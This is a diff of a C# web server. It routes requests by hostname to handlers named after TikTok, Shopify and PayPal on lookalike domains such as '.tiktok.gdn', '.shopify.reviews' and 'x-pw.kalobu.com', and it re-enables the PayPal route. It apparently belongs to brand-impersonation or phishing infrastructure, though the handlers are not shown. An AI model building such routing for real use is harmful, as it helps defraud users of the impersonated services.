@@ -31,12 +31,12 @@ using System.Collections.Generic;
 
 class WebServer
 {
-    private static void Main()
-    {
-        Start();
-    }
+    // private static void Main()
+    // {
+    //     Start();
+    // }
 
-    private static void Start()
+    private static void Main()
     {
         try
         {
@@ -56,7 +56,7 @@ class WebServer
         }
         finally
         {
-            Start();
+            Main();
         }
     }
 
@@ -64,24 +64,24 @@ class WebServer
     {
         try
         {
-            Console.WriteLine("[Request] {0} {1}", context.Request.HttpMethod, context.Request.Url);
+            Console.WriteLine("[HTTP] {0} {1}", context.Request.HttpMethod, context.Request.Url);
 
             if (context.Request.Url.HostNameType != UriHostNameType.Dns)
             {
-                RespondWithHtml(context, "<h3> Direct IP not allowed. </h3> <p> Request ID: {0} </p>", Guid.NewGuid());
+                RespondWithStatus(context, 400);
             }
-            else if (context.Request.Url.Host.EndsWith(".tiktok.gdn")) 
+            else if (context.Request.Url.Host.EndsWith(".tiktok.gdn"))
             {
-                TikTokWebsite.HandleRequest(context);   
+                TikTokWebsite.HandleRequest(context);
             }
             else if (context.Request.Url.Host.EndsWith(".shopify.reviews"))
             {
                 ShopifyWebsite.HandleRequest(context);
             }
-//             else if (context.Request.Url.Host == "x-pw.kalobu.com")
-//             {
-//                 PayPalWebsite.HandleRequest(context);
-//             }
+            else if (context.Request.Url.Host == "x-pw.kalobu.com")
+            {
+                PayPalWebsite.HandleRequest(context);
+            }
             else
             {
                 ShopifyProxy.HandleRequest(context);
@@ -174,10 +174,10 @@ class WebServer
         }
     }
 
-//         public static T DecodeJsonString<T>(string content)
-//         {
-//             return JsonSerializer.Deserialize<T>(content);
-//         }
+    // public static T DecodeJsonString<T>(string content)
+    // {
+    //     return JsonSerializer.Deserialize<T>(content);
+    // }
 
     public static string GetUserIdentifier(HttpListenerContext context)
     {
